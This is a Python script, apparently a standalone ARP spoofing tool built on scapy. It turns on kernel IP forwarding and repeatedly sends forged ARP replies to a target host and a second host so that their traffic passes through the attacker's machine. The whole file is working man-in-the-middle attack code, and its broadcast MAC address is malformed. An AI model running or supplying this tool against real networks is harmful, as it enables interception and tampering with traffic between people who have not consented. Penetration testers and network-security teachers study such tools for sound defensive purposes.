#!/usr/bin/python
############################################################
# Requirements:
# pip install scapy
# 
# Remember: Enable Kernel Routing 
#     echo 1 > /proc/sys/net/ipv4/ip_forward
############################################################
from scapy.all import *
import threading
import argparse
import os
import datetime
import binascii
from termcolor import colored
import os

# To stop scapy from checking return packet originating from any packet that we have sent out
conf.checkIPaddr=False

# Disable default scapy output
conf.verb = 0

# Arguments
parser = argparse.ArgumentParser()
parser.add_argument('-no_routing', required=False, action='store_true', help='[Optional] Disable automatic kernel routing enabler.')
parser.add_argument('-i', required=True, action='store', dest='interface',help='Interface to use on DHCP attacks.')
parser.add_argument('-t', required=True, action='store', dest='target_address', help='Targuet Address')
parser.add_argument('-s', required=True, action='store', dest='spoof_address', help='Spoofed Address.')
args = parser.parse_args()

# Configuration
ip_target = args.target_address
ip_spoof = args.spoof_address
localiface = args.interface
ip_forward = '/proc/sys/net/ipv4/ip_forward'


# Header
print ('###[ ARP Spoofer ]###')
print ('###[ Version 0.4 ]###')
print ('###[ Date 12/04/2020 ]###')
print ('###[ by Bruno Botelho - bruno.botelho.br@gmail.com ]###')
print ('')

localmac = get_if_hwaddr(localiface)

def enable_packet_forwarding():
    with open(ip_forward, 'w') as fd:
        fd.write('1')

def disable_packet_forwarding():
    with open(ip_forward, 'w') as fd:
        fd.write('0')

def log_timestamp():
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def mac_to_hex(mac):
    if '3.' in platform.python_version():
        return binascii.unhexlify(mac.replace(':',''))
    else:
        return mac.replace(':', '').decode('hex')

def get_mac_fom_ip(ip):
    resp, unans = sr(ARP(op=1, hwdst='ff:ff:ff:ff:ff:f', pdst=ip), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc

def arp_poison(ip_a, mac_a, ip_b, mac_b):
    print ('###[ ' + log_timestamp() + 'IP Target address  :' + colored(ip_target,'red') + ' ]###')
    print ('###[ ' + log_timestamp() + 'IP Spoofed address :' + colored(ip_spoof,'blue') + ' ]###')
    print ('###[ ' + log_timestamp() + 'Started ARP poison attack [CTRL-C to stop] ]###')
    print ('')
    while True:
        pkt = ARP(op=2, pdst=ip_a, hwdst=mac_a, psrc=ip_b)
        send(pkt)
        print ('###[ ' + log_timestamp() + ' Forged ARP Replay for : ' + colored(ip_a,'red') + ' : ' + colored(ip_b,'blue') + ' is at ' + colored(localmac,'blue') + ' ]###')
        #print pkt.summary()
        #print pkt.display()        
        pkt = ARP(op=2, pdst=ip_b, hwdst=mac_b, psrc=ip_a)
        send(pkt)    
        print ('###[ ' + log_timestamp() + ' Forged ARP Replay for : ' + colored(ip_b,'red') + ' : ' + colored(ip_a,'blue') + ' is at ' + colored(localmac,'blue') + ' ]###')
        #print pkt.summary()
           #print pkt.display()                
        print ('')
        time.sleep(2)


if args.no_routing:
    print ('###[  Ignore Kernel Routing disabled ]###')
    print ('')
else:
    print ('###[  Enable Kernel Routing enabling ]###')
    print ('###[  echo 1 > /proc/sys/net/ipv4/ip_forward ]###')
    enable_packet_forwarding()
    print ('')
mac_target = get_mac_fom_ip(ip_target)
mac_spoof = get_mac_fom_ip(ip_spoof)
try:
    arp_poison(ip_spoof, mac_spoof, ip_target, mac_target)
except KeyboardInterrupt:
    pass
if not args.no_routing:
    disable_packet_forwarding()
